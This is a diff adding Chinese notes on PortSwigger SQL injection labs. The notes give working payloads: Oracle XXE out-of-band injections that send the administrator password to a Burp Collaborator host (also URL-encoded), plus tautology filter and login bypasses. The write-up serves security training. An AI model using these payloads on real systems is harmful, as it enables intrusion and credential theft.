@@ -337,8 +337,87 @@ if __name__ == "__main__":
 
 #### 13. Blind SQL injection with out-of-band interaction
 
+题目说的是，这个查询是异步过程，但是可以产生交互。
+
+sheet给的东西：
+
 > The following technique leverages an XML external entity ([XXE](https://portswigger.net/web-security/xxe)) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence:
 > `SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual`
 >
 > The following technique works on fully patched Oracle installations, but requires elevated privileges:
 > `SELECT UTL_INADDR.get_host_address('YOUR-SUBDOMAIN-HERE.burpcollaborator.net')`
+
+这个是用XXE漏洞。
+
+payload：
+
+`r1R9CxHx0wDQX1Xc'||(SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://h8qpllvx80x45jkz4nf3w38rhin9by.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual)--`
+
+因为有许多特殊符号，所以我将上面的payload进行了url编码（也可以只编码特殊符号）
+
+`%72%31%52%39%43%78%48%78%30%77%44%51%58%31%58%63%27%7c%7c%28%53%45%4c%45%43%54%20%65%78%74%72%61%63%74%76%61%6c%75%65%28%78%6d%6c%74%79%70%65%28%27%3c%3f%78%6d%6c%20%76%65%72%73%69%6f%6e%3d%22%31%2e%30%22%20%65%6e%63%6f%64%69%6e%67%3d%22%55%54%46%2d%38%22%3f%3e%3c%21%44%4f%43%54%59%50%45%20%72%6f%6f%74%20%5b%20%3c%21%45%4e%54%49%54%59%20%25%20%72%65%6d%6f%74%65%20%53%59%53%54%45%4d%20%22%68%74%74%70%3a%2f%2f%68%38%71%70%6c%6c%76%78%38%30%78%34%35%6a%6b%7a%34%6e%66%33%77%33%38%72%68%69%6e%39%62%79%2e%62%75%72%70%63%6f%6c%6c%61%62%6f%72%61%74%6f%72%2e%6e%65%74%2f%22%3e%20%25%72%65%6d%6f%74%65%3b%5d%3e%27%29%2c%27%2f%6c%27%29%20%46%52%4f%4d%20%64%75%61%6c%29%2d%2d`
+
+#### 14. Blind SQL injection with out-of-band data exfiltration
+
+> The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.
+>
+> To solve the lab, log in as the `administrator` user.
+
+这个题要用上面第13题的方法，然后将查询结果返回到burp collaborator里面。
+
+先去第13题的方法测一下用的是哪一个数据库。
+
+经过测试，用的是**Oracle**数据库。
+
+然后去sheet里面找资料：
+
+> ```
+> SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual
+> ```
+
+这个的意思就是用Oracle的字符串拼接，再加上xxe漏洞将查询到的结果发送到burp collaborator里面。
+
+pyaload：
+
+````
+yXi2wL0MOS2G4SvP'||(SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(select password from users where username='administrator')||'.xmnyo8c2hz69b2hl7yckpfnf167wvl.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual)--
+url编码：
+%79%58%69%32%77%4c%30%4d%4f%53%32%47%34%53%76%50%27%7c%7c%28%53%45%4c%45%43%54%20%65%78%74%72%61%63%74%76%61%6c%75%65%28%78%6d%6c%74%79%70%65%28%27%3c%3f%78%6d%6c%20%76%65%72%73%69%6f%6e%3d%22%31%2e%30%22%20%65%6e%63%6f%64%69%6e%67%3d%22%55%54%46%2d%38%22%3f%3e%3c%21%44%4f%43%54%59%50%45%20%72%6f%6f%74%20%5b%20%3c%21%45%4e%54%49%54%59%20%25%20%72%65%6d%6f%74%65%20%53%59%53%54%45%4d%20%22%68%74%74%70%3a%2f%2f%27%7c%7c%28%73%65%6c%65%63%74%20%70%61%73%73%77%6f%72%64%20%66%72%6f%6d%20%75%73%65%72%73%20%77%68%65%72%65%20%75%73%65%72%6e%61%6d%65%3d%27%61%64%6d%69%6e%69%73%74%72%61%74%6f%72%27%29%7c%7c%27%2e%78%6d%6e%79%6f%38%63%32%68%7a%36%39%62%32%68%6c%37%79%63%6b%70%66%6e%66%31%36%37%77%76%6c%2e%62%75%72%70%63%6f%6c%6c%61%62%6f%72%61%74%6f%72%2e%6e%65%74%2f%22%3e%20%25%72%65%6d%6f%74%65%3b%5d%3e%27%29%2c%27%2f%6c%27%29%20%46%52%4f%4d%20%64%75%61%6c%29%2d%2d
+````
+
+拿到密码之后登陆就好了。
+
+#### 15. SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
+
+> This lab contains an SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out an SQL query like the following:
+>
+> ```
+> SELECT * FROM products WHERE category = 'Gifts' AND released = 1
+> ```
+>
+> To solve the lab, perform an SQL injection attack that causes the application to display details of all products in any category, both released and unreleased.
+
+这个题应该是注入点在`category = 'Gifts'`这里。
+
+构造payload：
+
+`SELECT * FROM products WHERE category = 'Gifts  ' or '1'='1'--   ' AND released = 1`
+
+payload：
+
+`/filter?category=xxx' or '1'='1'--`
+
+#### 16. SQL injection vulnerability allowing login bypass
+
+> This lab contains an SQL injection vulnerability in the login function.
+>
+> To solve the lab, perform an SQL injection attack that logs in to the application as the `administrator` user.
+
+这个题的注入点在login那里。
+
+我直接在用户那里输入`' or '1'='1'--`就通过了。
+
+官方的payload：`administrator'--`
+
+这里猜想应该是将用户和密码放到一起进行查找，却没有进行字符串过滤，导致密码那一部分直接被注释掉了。
+
